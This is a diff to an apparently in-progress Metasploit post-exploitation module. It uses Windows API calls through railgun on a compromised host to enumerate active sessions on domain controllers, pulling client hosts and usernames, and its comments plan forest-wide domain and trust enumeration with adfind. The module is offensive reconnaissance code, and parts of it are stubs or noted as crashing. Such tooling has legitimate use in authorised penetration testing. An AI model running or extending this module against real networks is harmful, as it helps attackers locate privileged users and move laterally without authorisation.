@@ -43,6 +43,7 @@ class Metasploit3 < Msf::Post
 		#Create an array to hold final list domain, group, user, ip
 	
 		#Get current domain or set it from the option
+		#Check if domain == computername, if so fail
 	
 		#Get a list of all of the domains in the forrest
 		# adfind -sc domainlist 
@@ -58,35 +59,40 @@ class Metasploit3 < Msf::Post
 		# adfind -b dc=trusted,dc=otherdomain,dc=domainname,dc=com -sc
 		# add to the domain controllers array
 		
-		#For each domain controller grab the active sessions add add to a
+		#For each domain controller grab the active sessions add to array 
+		#note: most of this code is based on mubix's enum_domains module
 		
-		# Most of the code below is from Mubix's enum_domains module
-		
-		buffersize = 500
-		result = client.railgun.netapi32.NetSessionEnum(nil,nil,nil,10,4,buffersize,4,4,nil)
-		print_status("Finding the right buffersize...")
-		while result['return'] == 234
-			print_status("Tested #{buffersize}, got #{result['entriesread']} of #{result['totalentries']}")
-			buffersize = buffersize + 500
-			result = client.railgun.netapi32.NetSessionEnum(nil,nil,nil,10,4,buffersize,4,4,nil)
-		end
+		buffersize = 1000
+		#getsize = client.railgun.netapi32.NetSessionEnum(nil,nil,nil,10,4,buffersize,4,4,nil)
+		#buffersize = getsize['bufptr']
 
+		result = client.railgun.netapi32.NetSessionEnum(nil,nil,nil,10,4,buffersize,4,4,nil)
+		
 		count = result['totalentries']
 		print_status("#{count} Sessions found.")
 		startmem = result['bufptr']
 
 		base = 0
 		mysessions = []
-		mem = client.railgun.memread(startmem, 8*count)
+		mem = client.railgun.memread(startmem, 8*count) #note: this dies if count= 0; at handling; http://msdn.microsoft.com/en-us/library/windows/desktop/bb525382(v=vs.85).aspx
 		count.times{|i|
 			x = {}
-			x[:a] = mem[(base + 0),4].unpack("V*")[0]
-			nameptr = mem[(base + 4),4].unpack("V*")[0]
-			x[:b] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
+			
+			# Grab returned
+			client_ptr = mem[(base + 0),4].unpack("V*")[0]
+			username_ptr = mem[(base + 4),4].unpack("V*")[0]
+			
+			# Parse returned data
+			x[:client] = client.railgun.memread(client_ptr,255).split("\0\0")[0].split("\0").join	
+			x[:username] = client.railgun.memread(username_ptr,255).split("\0\0")[0].split("\0").join	
+			
+			#Print session - only getting 2nd column
+			print_status("client, username, active time, idle time")
+			print_status("#{x[:client]}, #{x[:username]}")
+			
 			mysessions << x
 			base = base + 8
-		}
-		puts mysessions.inspect
+		}		
 		
 	end
 end
